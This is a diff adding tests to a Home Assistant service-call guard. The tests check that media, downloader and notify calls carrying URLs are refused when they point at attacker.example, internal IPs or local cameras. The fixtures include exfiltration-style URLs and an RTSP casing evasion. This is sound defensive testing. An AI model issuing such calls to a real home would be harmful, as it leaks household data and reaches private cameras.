@@ -156,3 +156,84 @@ describe("enforceServiceCall", () => {
     expect(verdict.allowed).toBe(false);
   });
 });
+
+describe("service fields that make Home Assistant fetch a URL", () => {
+  const grants = [
+    { domain: "media_player", access: "control" as const },
+    { domain: "downloader", access: "control" as const },
+    { domain: "notify", access: "control" as const },
+  ];
+  const speaker = { entity_id: "media_player.kitchen" };
+
+  const exits: [string, Parameters<typeof enforceServiceCall>[1]][] = [
+    [
+      "play_media content id",
+      {
+        domain: "media_player",
+        service: "play_media",
+        target: speaker,
+        data: { media_content_id: "https://attacker.example/?d=home", media_content_type: "music" },
+      },
+    ],
+    [
+      "play_media art in metadata (read-back through HA's proxy)",
+      {
+        domain: "media_player",
+        service: "play_media",
+        target: speaker,
+        data: {
+          media_content_id: "media-source://radio_browser/abc",
+          media_content_type: "music",
+          extra: { metadata: { images: [{ url: "http://cam.local/snap.jpg" }] } },
+        },
+      },
+    ],
+    [
+      "download_file url",
+      { domain: "downloader", service: "download_file", data: { url: "http://10.0.0.5/x" } },
+    ],
+    [
+      "notify attachment",
+      {
+        domain: "notify",
+        service: "mobile_app_phone",
+        data: { data: { image: "//attacker.example/i.png" } },
+      },
+    ],
+    [
+      "rtsp stream",
+      {
+        domain: "media_player",
+        service: "play_media",
+        target: speaker,
+        data: { media_content_id: " RTSP://cam.local/live", media_content_type: "video" },
+      },
+    ],
+  ];
+
+  for (const [name, call] of exits) {
+    test(`refuses ${name}`, () => {
+      const verdict = enforceServiceCall(grants, call, mirror());
+      expect(verdict.allowed).toBe(false);
+    });
+  }
+
+  test("allows media sources and provider ids that stay inside Home Assistant", () => {
+    for (const id of [
+      "media-source://media_source/local/song.mp3",
+      "spotify:track:4uLU6hMCjMI75M1A2tKUQC",
+    ]) {
+      const verdict = enforceServiceCall(
+        grants,
+        {
+          domain: "media_player",
+          service: "play_media",
+          target: speaker,
+          data: { media_content_id: id, media_content_type: "music" },
+        },
+        mirror(),
+      );
+      expect(verdict.allowed).toBe(true);
+    }
+  });
+});
